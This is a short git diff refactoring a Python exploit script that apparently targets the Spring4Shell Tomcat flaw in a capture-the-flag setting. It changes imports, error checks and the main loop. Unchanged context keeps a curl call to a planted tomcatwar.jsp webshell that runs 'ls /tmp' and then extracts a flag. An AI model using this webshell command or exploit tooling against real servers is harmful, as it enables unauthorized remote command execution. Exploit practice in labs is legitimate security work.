@@ -2,7 +2,7 @@ from urllib.parse import urljoin
 
 import requests
 
-from tool.base import match_flag, parse_ip_port, run_cmd
+from tool.base import match_flag, process, run_cmd
 
 
 def Exploit(url):
@@ -42,7 +42,7 @@ def run(target: str):
         return False, "", err
 
     cr = run_cmd(f"curl -s '{target}/tomcatwar.jsp?pwd=j&cmd=ls%20%2Ftmp'")
-    if cr.return_code != 0:
+    if not cr.ok:
         return False, "", "error"
     flag = match_flag(cr.output)
     if not flag:
@@ -52,20 +52,7 @@ def run(target: str):
 
 
 def main(ip_port: str):
-
-    tg = parse_ip_port(ip_port)
-    if not tg.ok:
-        print(tg.error)
-        return
-    for url in tg.build_urls():
-        try:
-            ok, result, err = run(url)
-            if ok:
-                print(f"[+] 成功: {url} -> {result}")
-            else:
-                print(f"[-] 失败: {url} -> {err}")
-        except Exception as e:
-            print(f"[!] 异常: {url} -> {str(e)}")
+    process(ip_port, run)
 
 
 if __name__ == "__main__":
